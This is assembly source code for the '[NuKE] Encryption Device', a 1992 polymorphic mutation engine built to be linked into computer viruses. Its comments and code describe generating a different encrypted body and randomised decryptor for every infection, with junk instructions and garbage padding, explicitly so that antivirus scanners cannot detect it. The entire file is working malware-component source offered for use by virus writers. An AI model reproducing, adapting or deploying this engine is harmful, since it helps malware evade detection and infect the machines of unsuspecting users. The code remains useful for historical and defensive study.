;******************************************************************************
; [NuKE] BETA TEST VERSION -- NOT FOR PUBLIC RELEASE!
;
; This product is not to be distributed to ANYONE without the complete and
; total agreement of both the author(s) and [NuKE].  This applies to all
; source code, executable code, documentation, and other files included in
; this package.
;
; Unless otherwise specifically stated, even the mere existance of this
; product is not to be mentioned to or discussed in any fashion with ANYONE,
; except with the author(s) and/or other [NuKE] members.
;
; WARNING:  This product has been marked in such a way that, if an
; unauthorized copy is discovered ANYWHERE, the violation can be easily
; traced back to its source, who will be located and punished.
; YOU HAVE BEEN WARNED.
;******************************************************************************


;*******************************************************************************
; The [NuKE] Encryption Device v0.90á
;
; (C) 1992 Nowhere Man and [NuKE] International Software Development Corp.
; All Rights Reserved.  Unauthorized use strictly prohibited.
;
;*******************************************************************************
; Written by Nowhere Man
; October 18, 1992
; Version 0.90á
;*******************************************************************************
;
; Synopsis:  The [NuKE] Encryption Device (N.E.D.) is a polymorphic mutation
;	     engine, along the lines of Dark Avenger's now-famous MtE.
;	     Unlike MtE, however, N.E.D. can't be SCANned, and probably will
;	     never be, either, since there is no reliable pattern between
;	     mutations, and the engine itself (and its RNG) are always
;	     kept encrypted.
;
;	     N.E.D. is easily be added to a virus.  Every infection with
;	     that virus will henceforth be completely different from all
; 	     others, and all will be unscannable, thanks to the Cryptex(C)
;	     polymorphic mutation algorithm.
;
;	     N.E.D. only adds about 15 or so bytes of decryption code
;	     (probably more, depending on which options are enabled), plus
;	     the 1355 byte overhead needed for the engine itself (about half
;            the size of MtE!).
;*******************************************************************************


;*******************************************************************************
;                         Segment declarations
;*******************************************************************************

.model tiny
.code


;*******************************************************************************
;         Equates used to save three bytes of code (was it worth it?)
;*******************************************************************************

load_point	equ	si + _load_point - ned_start
encr_instr	equ	si + _encr_instr - ned_start
store_point	equ	si + _store_point - ned_start

buf_ptr		equ	si + _buf_ptr - ned_start
copy_len	equ	si + _copy_len - ned_start
copy_off	equ	si + _copy_off - ned_start
v_start		equ	si + _v_start - ned_start
options		equ	si + _options - ned_start

byte_word	equ	si + _byte_word - ned_start
up_down		equ	si + _up_down - ned_start
mem_reg		equ	si + _mem_reg - ned_start
loop_reg	equ	si + _loop_reg - ned_start
key_reg		equ	si + _key_reg - ned_start

mem_otr		equ	si + _mem_otr - ned_start
used_it		equ	si + _used_it - ned_start
jump_here	equ	si + _jump_here - ned_start
adj_here	equ	si + _adj_here - ned_start

word_adj_table	equ	si + _word_adj_table - ned_start
byte_adj_table	equ	si + _byte_adj_table - ned_start

the_key		equ	si + _the_key - ned_start

crypt_type	equ	si + _crypt_type - ned_start
op_byte		equ	si + _op_byte - ned_start
rev_op_byte	equ	si + _rev_op_byte - ned_start
modr_m		equ	si + _modr_m - ned_start

dummy_word_cmd	equ	si + _dummy_word_cmd - ned_start
dummy_three_cmd	equ	si + _dummy_three_cmd - ned_start

tmp_jmp_store	equ	si + _tmp_jmp_store - ned_start
jump_table	equ	si + _jump_table - ned_start

rand_val	equ	si + _rand_val - ned_start


;******************************************************************************
;                                Publics
;******************************************************************************

public		nuke_enc_dev
public		ned_end



;*******************************************************************************
;                [NuKE] Encryption Device begins here....
;*******************************************************************************

ned_begin	label	near			; Start of the N.E.D.'s code


;******************************************************************************
; nuke_enc_dev
;
; This procedure merely calls ned_main.
;
; Arguments:    Same as ned_main; this is a shell procedure
;
; Returns:	Same as ned_main; this is a shell procedure
;******************************************************************************

nuke_enc_dev	proc	near
		public	nuke_enc_dev		; Name in .OBJs and .LIBs

		push	bx                      ;
		push	cx                      ;
		push	dx                      ; Preserve registers
		push	si                      ; (except for AX, which is
		push	di                      ; used to return something)
		push	bp                      ;

		call	ned_main		; Call the [NuKE] Encryption
						; Device, in all it's splendor

		pop	bp			;
		pop	di                      ;
		pop	si                      ;
		pop	dx                      ; Restore registers
		pop	cx                      ;
		pop	bx                      ;

		ret				; Return to the main virus


; This the copyright message (hey, I wrote the thing, so I can waste a few
; bytes bragging...).

copyright	db	13,10
		db	"[NuKE] Encryption Device v0.90á",13,10
		db	"(C) 1992 Nowhere Man and [NuKE]",13,10,0
nuke_enc_dev	endp


;******************************************************************************
; ned_main
;
; Fills a buffer with a random decryption routine and encrypted viral code.
;
; Arguments:    AX = offset of buffer to hold data
;		BX = offset of code start
;		CX = offset of the virus in memory (next time around!)
;		DX = length of code to copy and encrypt
;		SI = options:
;			bit 0:	dummy instructions
;			bit 1:	MOV variance
;			bit 2:  ADD/SUB substitution
;			bit 3:  garbage code
;			bit 4:  don't assume DS = CS
;			bits 5-15:  reserved
;
; Returns:	AX = size of generated decryption routine and encrypted code
;******************************************************************************

ned_main	proc	near
		mov	di,si			; We'll need SI, so use DI
		not	di			; Reverse all bits for TESTs

		call	ned_start		; Ah, the old virus trick
ned_start:	pop	si			; for getting our offset...

		mov	word ptr [used_it],0	; A truely hideous way to
		mov	word ptr [used_it + 2],0; reset the register usage
		mov	word ptr [used_it + 4],0; flags...
		mov	byte ptr [used_it + 6],0;

		add	dx,ned_end - ned_begin	; Be sure to encrypt ourself!

		mov	word ptr [buf_ptr],ax	; Save the function
		mov	word ptr [copy_off],bx	; arguments in an
		mov	word ptr [v_start],cx	; internal buffer
		mov	word ptr [copy_len],dx	; for later use
		mov	word ptr [options],di	;

		xchg	di,ax			; Need the buffer offset in DI

		mov	ax,2			; Select a random number
		call	rand_num		; between 0 and 1
		mov	word ptr [byte_word],ax	; Save byte/word flag

		mov	ax,2			; Select another random number
		call	rand_num		; between 0 and 1
		xor	ax,ax			; !!!!DELETE ME!!!!
		mov	word ptr [up_down],ax	; Save up/down flag

		mov	ax,4			; Select a random number
		call	rand_num                ; between 0 and 3
		mov	word ptr [mem_reg],ax	; Save memory register
		xchg	bx,ax			; Place in BX for indexing
		shl	bx,1			; Convert to word index
		mov	bx,word ptr [mem_otr + bx]  ; Get register number
		inc	byte ptr [used_it + bx] ; Cross off register

		xor	cx,cx			; We need a word register
		call	random_reg		; Get a random register
		inc	byte ptr [used_it + bx] ; Cross it off...
		mov	word ptr [loop_reg],ax	; Save loop register

		mov	ax,2			; Select a random number
		call	rand_num                ; between 0 and 1
		or	ax,ax			; Does AX = 0?
		je	embedded_key		; If so, the key's embedded
		mov	cx,word ptr [byte_word]	; CX holds the byte word flag
		neg	cx			; By NEGating CX and adding one
		inc	cx			; CX will be flip-flopped
		call	random_reg		; Get a random register
		inc	byte ptr [used_it + bx] ; Cross it off...
		mov	word ptr [key_reg],ax	; Save key register
		jmp	short create_routine	; Ok, let's get to it!
embedded_key:	mov	word ptr [key_reg],-1	; Set embedded key flag

create_routine: call	add_nop			; Add a do-nothing instruction?
		mov	ax,2			; Select a random number
		call	rand_num		; between 0 and 1
		or	ax,ax			; Does AX = 0?
		je	pointer_first		; If so, load pointer then count
		call	load_count		; Load start register
		call	add_nop			; Add a do-nothing instruction?
		call	load_pointer		; Load pointer register
		jmp	short else_end1		; Skip the ELSE part
pointer_first: 	call	load_pointer		; Load start register
		call	add_nop			; Add a do-nothing instruction?
		call	load_count		; Load count register
else_end1:	call	add_nop			; Add a do-nothing instruction?
		call	load_key		; Load encryption key
		call	add_nop			; Add a do-nothing instruction?
		mov	word ptr [jump_here],di	; Save the offset of the loop
		call	add_decrypt		; Create the decryption code
		call	add_nop			; Add a do-nothing instruction?
		call	adjust_ptr		; Adjust the memory pointer
		call	add_nop			; Add a do-nothing instruction?
		call    end_loop		; End the decryption loop
		call	random_fill		; Pad with random bullshit?

		mov	ax,di			; AX points to our current place
		sub	ax,word ptr [buf_ptr]	; AX now holds # bytes written

		mov	bx,word ptr [adj_here]	; Find where we need to adjust
		add	word ptr [bx],ax	; Adjust the starting offset

		add	ax,word ptr [copy_len]	; Add length of encrypted code
		push	ax		       	; Save this for later

		mov	bx,word ptr [crypt_type]; BX holds encryption type
		mov	bl,byte ptr [rev_op_byte + bx]  ; Load encryption byte
		mov	bh,0D8h			; Fix a strange problem...
		mov	word ptr [encr_instr],bx; Save it into our routine

		mov	cx,word ptr [copy_len]	; CX holds # of bytes to encrypt
		cmp	word ptr [byte_word],0	; Are we doing it by bytes?
		je	final_byte_k		; If so, reset LODS/STOS stuff
		mov	byte ptr [load_point],0ADh  ; Change it to a LODSW
		mov	byte ptr [store_point],0ABh  ; Change it to a STOSW
		shr	cx,1			; Do half as many repetitions
		mov	bx,word ptr [the_key]	; Reload the key
		inc	byte ptr [encr_instr]	; Fix up for words...
		jmp	short encrypt_virus	; Let's go!
final_byte_k:   mov	byte ptr [load_point],0ACh  ; Change it to a LODSW
		mov	byte ptr [store_point],0AAh  ; Change it to a STOSW
		mov	bl,byte ptr [the_key]	; Ok, so I did this poorly...

encrypt_virus:	mov	si,word ptr [copy_off]	; SI points to the original code


; This portion of the code is self-modifying.  It may be bad style, but
; it's far more efficient than writing six or so different routines...

_load_point:	lodsb				; Load a byte/word into AL
_encr_instr:	xor	al,bl			; Encrypt the byte/word
_store_point:	stosb				; Store the byte/word at ES:[DI]
		loop	_load_point		; Repeat until all bytes done

; Ok, we're through... back to normal


		pop	ax			; AX holds routine length

		ret				; Return to caller

_buf_ptr 	dw	?			; Pointer: storage buffer
_copy_len	dw	?			; Integer: # bytes to copy
_copy_off	dw	?			; Pointer: original code
_v_start	dw	?			; Pointer: virus start in file
_options	dw	?			; Integer: bits set options

_byte_word	dw	?			; Boolean: 0 = byte, 1 = word
_up_down	dw	?			; Boolean: 0 = up, 1 = down
_mem_reg     	dw	?			; Integer: 0-4 (SI, DI, BX, BP)
_loop_reg	dw	?			; Integer: 0-6 (AX, BX, etc.)
_key_reg	dw	?			; Integer: -1 = internal

_mem_otr	dw	4,5,1,6			; Array: Register # for mem_reg
_used_it	db	7 dup (0)		; Array: 0 = unused, 1 = used
_jump_here	dw	?			; Pointer: Start of loop
_adj_here	dw	?			; Pointer: Where to adjust
ned_main	endp


;******************************************************************************
; load_count
;
; Adds code to load the count register, which stores the number of
; iterations that the decryption loop must make.  if _byte_word = 0
; then this value is equal to the size of the code to be encrypted;
; if _byte_word = 1 (increment by words), it is half that length
; (since two bytes are decrypted at a time).
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

load_count	proc	near
		mov	bx,word ptr [loop_reg]	; BX holds register number
		mov	dx,word ptr [copy_len]	; DX holds size of virus
		mov	cx,word ptr [byte_word]	; Neat trick to divide by
		shr	dx,cl			; two if byte_word = 1
		mov	cx,1			; We're doing a word register
		call	gen_mov			; Generate a move
		ret				; Return to caller

_word_adj_table	db	00h, 03h, 01h, 02h, 06h, 07h, 05h  ; Array: ModR/M adj.
_byte_adj_table	db	04h, 00h, 07h, 03h, 05h, 01h, 06h, 02h  ; Array ""/byte
load_count	endp


;******************************************************************************
; load_pointer
;
; Adds code to load the pointer register, which points to the byte
; or word of memory that is to be encrypted.  Due to the flaws of
; 8086 assembly language, only the SI, DI, BX, and BP registers may
; be used.
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;******************************************************************************

load_pointer	proc	near
		mov	bx,word ptr [mem_reg]	; BX holds register number
		shl	bx,1			; Convert to word index
		mov	bx,word ptr [mem_otr + bx]  ; Convert register number
		mov	al,byte ptr [word_adj_table + bx]  ; Table look-up
		add	al,0B8h			; Create a MOV instruction
		stosb				; Store it in the code
		mov	word ptr [adj_here],di	; Save our current offset
		mov	ax,word ptr [v_start]	; AX points to virus (in host)
		cmp	word ptr [up_down],0	; Are we going upwards?
		je	no_adjust		; If so, no ajustment needed
		add	ax,word ptr [copy_len]	; Point to end of virus
no_adjust:	stosw				; Store the start offset
		ret				; Return to caller
load_pointer	endp


;******************************************************************************
; load_key
;
; Adds code to load the encryption key into a register.  If _byte_word = 0
; a 8-bit key is used; if it is 1 then a 16-bit key is used.  If the key
; is supposed to be embedded, no code is generated at this point.
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

load_key	proc	near
		mov	ax,0FFFFh		; Select a random number
		call	rand_num		; between 0 and 65534
		inc	ax			; Eliminate any null keys
		mov	word ptr [the_key],ax	; Save key for later
		mov	bx,word ptr [key_reg]	; DX holds the register number
		cmp	bx,-1			; Is the key embedded?
		je	blow_this_proc		; If so, just leave now
		xchg	dx,ax			; DX holds key
		mov	cx,word ptr [byte_word]	; CX holds byte/word flag
		call	gen_mov			; Load the key into the register
blow_this_proc:	ret				; Return to caller

_the_key	dw	?			; Integer: The encryption key
load_key	endp


;******************************************************************************
; add_decrypt
;
; Adds code to dencrypt a byte or word (pointed to by the pointer register)
; by either a byte or word register or a fixed byte or word.
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

add_decrypt	proc	near
		test	word ptr [options],010000b  ; Do we need a CS: override
		jne	no_override		; If not, don't add it...
		mov	al,02Eh			; Store a code-segment
		stosb				; override instruction (CS:)
no_override:	mov	ax,3			; Select a random number
		call	rand_num                ; between 0 and 2
		mov	word ptr [crypt_type],ax; Save encryption type
		xchg	bx,ax			; Now transfer it into BX
		mov	ax,word ptr [byte_word]	; 0 if byte, 1 if word
		cmp	word ptr [key_reg],-1	; Is the key embedded?
		je	second_case		; If so, it's a different story

		add	al,byte ptr [op_byte + bx]  ; Adjust by operation type
		stosb				; Place the byte in the code

		mov	ax,word ptr [mem_reg]	; AX holds register number
		mov	cl,3			; To get the ModR/M table
		shl	ax,cl			; offset, multiply by eight
		mov	bx,word ptr [key_reg]	; BX holds key register number
		cmp	word ptr [byte_word],0	; Is this a byte?
		je	byte_by_reg		; If so, special case
		mov	bl,byte ptr [word_adj_table + bx]  ; Create ModR/M
		jmp	short store_it_now	; Now save the byte
byte_by_reg:	mov	bl,byte ptr [byte_adj_table + bx]  ; Create ModR/M
store_it_now:   xor	bh,bh			; Clear out any old data
		add	bx,ax			; Add the first index
		mov	al,byte ptr [modr_m + bx]  ; Table look-up
		stosb				; Save it into the code
		cmp	word ptr [mem_reg],3	; Are we using BP?
		jne	a_d_exit1		; If not, leave
		xor	al,al			; For some dumb reason we'll
		stosb                           ; have to specify a 0 adjustment
a_d_exit1:	ret				; Return to caller


second_case:	add	al,080h			; Create the first byte
		stosb				; and store it in the code

		mov	al,byte ptr [op_byte + bx]  ; Load up the OP byte
		mov	bx,word ptr [mem_reg]	; BX holds register number
		mov	cl,3			; To get the ModR/M table
		shl	bx,cl			; offset, multiply by eight
		add	al,byte ptr [modr_m + bx]  ; Add result of table look-up
		stosb				; Save it into the code
		cmp	word ptr [mem_reg],3	; Are we using BP?
		jne	store_key		; If not, store the key
		xor	al,al			; For some dumb reason we'll
		stosb                           ; have to specify a 0 adjustment
store_key:	cmp	word ptr [byte_word],0	; Is this a byte?
		je	byte_by_byte		; If so, special case
		mov	ax,word ptr [the_key]	; Load up *the key*
		stosw				; Save the whole two bytes!
		jmp	short a_d_exit2		; Let's split, man
byte_by_byte:   mov	al,byte ptr [the_key]	; Load up *the key*
		stosb				; Save it into the code
a_d_exit2:	ret				; Return to caller

_crypt_type	dw	?			; Integer: Type of encryption
_op_byte	db	030h,000h,028h		; Array: OP byte of instruction
_rev_op_byte	db	030h,028h,000h		; Array: Reverse OP byte of ""
_modr_m		db	004h, 00Ch, 014h, 01Ch, 024h, 02Ch, 034h, 03Ch	; SI
		db	005h, 00Dh, 015h, 01Dh, 025h, 02Dh, 035h, 03Dh	; DI
		db	007h, 00Fh, 017h, 01Fh, 027h, 02Fh, 037h, 03Fh	; BX
		db	046h, 04Eh, 056h, 05Eh, 066h, 06Eh, 076h, 07Eh	; BP
add_decrypt	endp


;******************************************************************************
; adjust_ptr
;
; Adds code to adjust the memory pointer.  There are two possible choices:
; INC/DEC and ADD/SUB (inefficient, but provides variation).
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

adjust_ptr	proc	near
		mov	cx,word ptr [byte_word]	; CX holds byte/word flag
		inc	cx			; Increment; now # INCs/DECs
		mov	bx,word ptr [mem_reg]	; BX holds register number
		shl	bx,1			; Convert to word index
		mov	bx,word ptr [mem_otr + bx]  ; Convert register number
		mov	dx,word ptr [up_down]	; DX holds up/down flag
		call	gen_add_sub		; Create code to adjust pointer
		ret				; Return to caller
adjust_ptr	endp


;******************************************************************************
; end_loop
;
; Adds code to adjust the count variable, test to see if it's zero,
; and repeat the decryption loop if it is not.  There are three possible
; choices:  LOOP (only if the count register is CX), SUB/JNE (inefficient,
; but provides variation), and DEC/JNE (best choice for non-CX registers).
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

end_loop	proc	near
		mov	bx,word ptr [loop_reg]	; BX holds register number
		cmp	bx,2			; Are we using CX?
		jne	dec_jne			; If not, we can't use LOOP
		mov	ax,2			; Select a random number
		call	rand_num                ; between 0 and 1
		or	ax,ax			; Does AX = 0?
		jne	dec_jne                 ; If not, standard ending
		mov	al,0E2h			; We'll do a LOOP instead
		stosb                           ; Save the OP byte
		jmp	short store_jmp_loc	; Ok, now find the offset
dec_jne:	mov	cx,1			; Only adjust by one
		mov	dx,1			; We're subtracting...
		call	gen_add_sub		; Create code to adjust count
		mov	al,075h			; We'll do a JNE to save
		stosb				; Store a JNE OP byte
store_jmp_loc:	mov	ax,word ptr [jump_here]	; Find old offset
		sub	ax,di			; Adjust relative jump
		dec	ax			; Adjust by one (DI is off)
		stosb				; Save the jump offset
		ret				; Return to caller
end_loop	endp


;******************************************************************************
; add_nop
;
; Adds between 0 and 3 do-nothing instructions to the code, if they are
; allowed by the user (bit 0 set).
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

add_nop		proc	near
		push	ax			; Save AX
		push	bx			; Save BX
		push	cx			; Save CX

		test	word ptr [options],0001b; Are we allowing these?
		jne	outta_here		; If not, don't add 'em
		mov	ax,2			; Select a random number
		call	rand_num                ; between 0 and 1
		or	ax,ax			; Does AX = 0?
		je	outta_here		; If so, don't add any NOPs...
		mov	ax,4			; Select a random number
		call	rand_num                ; between 0 and 3
		xchg	cx,ax			; CX holds repetitions
		jcxz	outta_here		; CX = 0?  Split...
add_nop_loop:   mov	ax,4			; Select a random number
		call	rand_num                ; between 0 and 3
		or	ax,ax			; Does AX = 0?
		je	two_byter		; If so, a two-byte instruction
		cmp	ax,1			; Does AX = 1?
		je	three_byter		; If so, a three-byte instruction
		mov	al,090h			; We'll do a NOP instead
		stosb				; Store it in the code
		jmp	short loop_point	; Complete the loop
two_byter:	mov	ax,34			; Select a random number
		call	rand_num                ; between 0 and 33
		xchg	bx,ax			; Place in BX for indexing
		shl	bx,1			; Convert to word index
		mov	ax,word ptr [dummy_word_cmd + bx]  ; Get dummy command
		stosw				; Save it in the code...
		jmp	short loop_point	; Complete the loop
three_byter:	mov	ax,16			; Select a random number
		call	rand_num		; between 0 and 15
		mov	bx,ax			; Place in BX for indexing
		shl	bx,1			; Convert to word index
		add	bx,ax			; Add back value (BX = BX * 3)
		mov	ax,word ptr [dummy_three_cmd + bx]  ; Get dummy command
		stosw				; Save it in the code...
		mov	al,byte ptr [dummy_three_cmd + bx + 2]
		stosb				; Save the final byte, too
loop_point:	loop	add_nop_loop		; Repeat 0-2 more times
outta_here:	pop	cx			; Restore CX
		pop	bx			; Restore BX
		pop	ax			; Restore AX
		ret				; Return to caller

_dummy_word_cmd:				; Useless instructions,
						; two bytes each
		mov	ax,ax
		mov	bx,bx
		mov	cx,cx
		mov	dx,dx
		mov	si,si
		mov	di,di
		mov	bp,bp
		xchg	bx,bx
		xchg	cx,cx
		xchg	dx,dx
		xchg	si,si
		xchg	di,di
		xchg	bp,bp
		nop
		nop
		inc	ax
		dec	ax
		inc	bx
		dec	bx
		inc	cx
		dec	cx
		inc	dx
		dec	dx
		inc	si
		dec	si
		inc	di
		dec	di
		inc	bp
		dec	bp
		cmc
		cmc
		jmp	short $ + 2
		je	$ + 2
		jne	$ + 2
		jg	$ + 2
		jge	$ + 2
		jl	$ + 2
		jle	$ + 2
		jo	$ + 2
		jpe	$ + 2
		jpo	$ + 2
		js	$ + 2
		jcxz	$ + 2


_dummy_three_cmd:				; Useless instructions,
						; three bytes each
		xor	ax,0
		or	ax,0
		add	ax,0
		add	bx,0
		add	cx,0
		add	dx,0
		add	si,0
		add	di,0
		add	bp,0
		sub	ax,0
		sub	bx,0
		sub	cx,0
		sub	dx,0
		sub	si,0
		sub	di,0
		sub	bp,0
add_nop		endp


;******************************************************************************
; gen_mov
;
; Adds code to load a register with a value.  If MOV variance is enabled,
; inefficient, sometimes strange, methods may be used; if it is disabled,
; a standard MOV is used (wow).  Various alternate load methods include
; loading a larger value then subtracting the difference, loading a
; smaller value the adding the difference, loading an XORd value then
; XORing it by a key that will correct the difference, loading an incorrect
; value and NEGating or NOTing it to correctness, and loading a false
; value then loading the correct one.
;
; Arguments:	BX = register number
;		CX = 0 for byte register, 1 for word register
;		DX = value to store
;		SI = offset of ned_start
;               DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

gen_mov		proc
		test	word ptr [options],0010b; Do we allow wierd moves?
		je	quick_fixup		; If so, short jump over JMP
		jmp	make_mov		; If not, standard MOV
quick_fixup:	jcxz	byte_index_0		; If we're doing a byte, index
		mov	bl,byte ptr [word_adj_table + bx]  ; Table look-up
		jmp	short get_rnd_num	; Ok, get a random number now
byte_index_0:	mov	bl,byte ptr [byte_adj_table + bx]  ; Table look-up
get_rnd_num:	mov	ax,7			; Select a random number
		call	rand_num                ; between 0 and 6
		shl	ax,1			; Convert AX into word index
		lea	bp,word ptr [jump_table]  ; BP points to jump table
		add	bp,ax			; BP now points to the offset
		mov	ax,word ptr [bp]	; AX holds the jump offset
		add	ax,si			; Adjust by our own offset
		mov	word ptr [tmp_jmp_store],ax  ; Store in scratch variable
		mov	ax,0FFFFh		; Select a random number
		call	rand_num                ; between 0 and 65564
		xchg	bp,ax			; Place random number in BP
		jmp	word ptr [tmp_jmp_store]; JuMP to a load routine!
load_move:	xchg	dx,bp			; Swap DX and BP
		call	make_mov		; Load BP (random) in register
		call	add_nop			; Add a do-nothing instruction?
		xchg	dx,bp			; DX now holds real value
		jmp	short make_mov		; Load real value in reigster
load_sub:	add	dx,bp			; Add random value to load value
		call	make_mov		; Create a MOV instruction
		call	add_nop			; Add a do-nothing instruction?
		mov	ah,0E8h			; We're doing a SUB
		jmp	short make_add_sub	; Create the SUB instruction
load_add:	sub	dx,bp			; Sub. random from load value
		call	make_mov		; Create a MOV instruction
		call	add_nop			; Add a do-nothing instruction?
		mov	ah,0C0h			; We're doing an ADD
		jmp	short make_add_sub	; Create the ADD instruction
load_xor:	xor	dx,bp			; XOR load value by random
		call	make_mov		; Create a MOV instruction
		call	add_nop			; Add a do-nothing instruction?
		mov	ah,0F0h			; We're doing an XOR
		jmp	short make_add_sub	; Create the XOR instruction
load_not:	not	dx			; Two's-compliment DX
		call	make_mov		; Create a MOV instruction
		call	add_nop			; Add a do-nothing instruction?
load_not2:	mov	al,0F6h			; We're doing a NOT/NEG
		add	al,cl			; If it's a word, add one
		stosb				; Store the byte
		mov	al,0D0h			; Initialize the ModR/M byte
		add	al,bl			; Add back the register info
		stosb				; Store the byte
		ret				; Return to caller
load_neg:	neg	dx			; One's-compliment DX
		call	make_mov		; Create a MOV instruction
		add	bl,08h			; Change the NOT into a NEG
		jmp	short load_not2		; Reuse the above code

make_mov:       mov	al,0B0h			; Assume it's a byte for now
		add	al,bl			; Adjust by register ModR/M
		jcxz	store_mov		; If we're doing a byte, go on
		add	al,008h			; Otherwise, adjust for word
store_mov:	stosb				; Store the OP byte
		mov	ax,dx			; AX holds the load value
put_byte_or_wd:	jcxz	store_byte		; If it's a byte, store it
		stosw				; Otherwise store a whole word
		ret				; Return to caller
store_byte:	stosb				; Store the byte in the code
		ret				; Return to caller

make_add_sub:   mov	al,080h			; Create the OP byte
		add	al,cl			; If it's a word, add one
		stosb				; Store the byte
		mov	al,ah			; AL now holds ModR/M byte
		add	al,bl			; Add back the register ModR/M
		stosb				; Store the byte in the code
		xchg	bp,ax			; AX holds the ADD/SUB value
		jmp	short put_byte_or_wd	; Reuse the above code

_tmp_jmp_store	dw	?			; Pointer: temp. storage
_jump_table	dw	load_sub - ned_start, load_add - ned_start
		dw	load_xor - ned_start, load_not - ned_start
		dw	load_neg - ned_start, load_move - ned_start
		dw	make_mov - ned_start
gen_mov		endp


;******************************************************************************
; gen_add_sub
;
; Adds code to adjust a register either up or down.  A random combination
; of ADD/SUBs and INC/DECs is used to increase code variability.  Note
; that this procedure will only work on *word* registers; attempts to
; use this procedure for byte registers (AH, AL, etc.) may result in
; invalid code being generated.
;
; Arguments:	BX = ModR/M table offset for register
;		CX = Number to be added/subtracted from the register
;		DX = 0 for addition, 1 for subtraction
;		SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

gen_add_sub	proc	near
		jcxz	exit_g_a_s		; Exit if there's no adjustment
add_sub_loop:   call	add_nop			; Add a do-nothing instruction?
		cmp	cx,3			; Have to adjust > 3 bytes?
		ja	use_add_sub		; If so, no way we use INC/DEC!
		test	word ptr [options],0100b; Are ADD/SUBs allowed?
		jne	use_inc_dec		; If not, only use INC/DECs
		mov	ax,3			; Select a random number
		call	rand_num                ; between 0 and 2
		or	ax,ax			; Does AX = 0?
		je	use_add_sub		; If so, use ADD or SUB
use_inc_dec:	mov	al,byte ptr [word_adj_table + bx]  ; Table look-up
		add	al,040h			; It's an INC...
		or	dx,dx			; Are we adding?
		je	store_it0		; If so, store it
		add	al,08h			; Otherwise create a DEC
store_it0:	stosb				; Store the byte
		dec	cx			; Subtract one fromt total count
		jmp	short cxz_check		; Finish off the loop
use_add_sub:    mov	ax,2			; Select a random number
		call	rand_num                ; between 0 and 1
		shl	ax,1			; Now it's either 0 or 2
		mov	bp,ax			; Save the value for later
		add	al,081h			; We're going to be stupid
		stosb				; and use an ADD or SUB instead
		mov	al,byte ptr [word_adj_table + bx]  ; Table look-up
		add	al,0C0h			; It's an ADD...
		or	dx,dx			; Are we adding?
		je	store_it1		; If so, store it
		add	al,028h			; Otherwise create a SUB
store_it1:	stosb				; Store the byte
		mov    	ax,cx			; Select a random number
		call	rand_num		; between 0 and (CX - 1)
		inc	ax			; Ok, add back one
		or	bp,bp			; Does BP = 0?
		je	long_form		; If so, it's the long way
		stosb				; Store the byte
		jmp	short sub_from_cx	; Adjust the count now...
long_form:	stosw				; Store the whole word
sub_from_cx:	sub	cx,ax			; Adjust total count by AX
cxz_check:	or	cx,cx			; Are we done yet?
		jne     add_sub_loop		; If not, repeat until we are
exit_g_a_s:	ret				; Return to caller
gen_add_sub	endp


;******************************************************************************
; random_fill
;
; Pads out the decryption with random garbage; this is only enabled if
; bit 3 of the options byte is set.
;
; Arguments:	SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	None
;******************************************************************************

random_fill	proc	near
		test	word ptr [options],01000b  ; Are we allowing this?
		jne	exit_r_f		; If not, don't add garbage
		mov	ax,2			; Select a random number
		call	rand_num                ; between 0 and 1
		xchg	cx,ax			; Wow!  A shortcut to save
		jcxz    exit_r_f		; a byte!  If AX = 0, exit
		mov	ax,101			; Select a random number
		call	rand_num                ; between 0 and 100
		xchg	cx,ax			; Transfer to CX for LOOP
		jcxz	exit_r_f		; If CX = 0 then exit now...
		mov	al,0EBh			; We'll be doing a short
		stosb				; jump over the code...
		mov	ax,cx			; Let's get that value back
		stosb				; We'll skip that many bytes
garbage_loop:	mov	ax,0FFFFh		; Select a random number
		call	rand_num                ; between 0 and 65534
		stosb				; Store a random byte
		loop	garbage_loop		; while (--_CX == 0);
exit_r_f:	ret				; Return to caller
random_fill	endp


;******************************************************************************
; random_reg
;
; Returns the number of a random register.  If CX = 1, a byte register is
; used; if CX = 0, a word register is selected.
;
; Arguments:	CX = 0 for word, 1 for byte
;		SI = offset of ned_start
;		DI = offset of storage buffer
;
; Returns:	AX = register number
;		BX = register's offset in cross-off table (used_it)
;******************************************************************************

random_reg	proc	near
get_rand_reg:	mov	ax,cx			; Select a random number
		add	ax,7			; between 0 and 6 for words
		call	rand_num                ; or 0 and 7 for bytes
		mov	bx,ax			; Place in BX for indexing
		shr	bx,cl			; Divide by two for bytes only
		cmp	byte ptr [used_it + bx],0  ; Register conflict?
		jne	get_rand_reg		; If so, try again
		ret				; Return to caller
random_reg	endp


;******************************************************************************
; rand_num
;
; Random number generation procedure for the N.E.D.  This procedure can
; be safely changed without affecting the rest of the module, with the
; following restrictions:  all registers that are changed must be preserved
; (except, of course, AX), and AX must return a random number between
; 0 and (BX - 1).  This routine was kept internal to avoid the mistake
; that MtE made, that is using a separate .OBJ file for the RNG.  (When
; a separate file is used, the RNG's location isn't neccessarily known,
; and therefore the engine can't encrypt it.  McAfee, etc. scan for
; the random-number generator.)
;
; Arguments:	BX = maximum random number + 1
;
; Returns:	AX = psuedo-random number between 0 and (BX - 1)
;******************************************************************************

rand_num	proc	near
		push	dx			; Save DX
		push	cx			; Save CX

		push	ax			; Save AX

		rol	word ptr [rand_val],1	; Adjust seed for "randomness"
		add	word ptr [rand_val],0754Eh  ; Adjust it again

		xor	ah,ah			; BIOS get timer function
		int	01Ah

		xor	word ptr [rand_val],dx	; XOR seed by BIOS timer
		xor	dx,dx			; Clear DX for division...

		mov	ax,word ptr [rand_val]	; Return number in AX
		pop	cx			; CX holds max value
		div	cx			; DX = AX % max_val
		xchg	dx,ax			; AX holds final value

		pop	cx			; Restore CX
		pop	dx			; Restore DX
		ret				; Return to caller

_rand_val	dw	0			; Seed for generator
rand_num	endp

ned_end		label	near			; The end of the N.E.D.

		end